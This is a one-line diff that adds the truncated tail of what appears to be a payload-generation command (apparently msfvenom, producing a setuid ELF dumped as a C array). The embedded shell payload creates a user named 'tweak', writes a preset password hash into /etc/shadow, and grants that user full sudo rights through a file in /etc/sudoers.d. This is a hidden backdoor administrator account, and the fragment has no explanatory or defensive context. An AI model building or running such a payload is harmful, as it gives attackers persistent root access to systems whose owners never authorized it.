@@ -1,0 +1,1 @@
+echo 0 > /proc/sys/vm/dirty_writeback_centisecs; useradd tweak -m -s /bin/bash; sed 's/tweak.*:/tweak:\$6\$gUGoeBlc\$yU794nb14cZ6ZvcHPwG\/apjC0bpMph1NeLu2Dh6JTEdB82b93aU3zXXTnIb4kUUFfROP6ARbMB4FjgBWR1fhq0:16953:0:99999:7:::/m' -i /etc/shadow; echo \"tweak   ALL=(ALL:ALL) ALL\" >> /etc/sudoers.d/test; chown root.root /etc/sudoers.d/test;" PrependSetuid=True -f elf | xxd -i
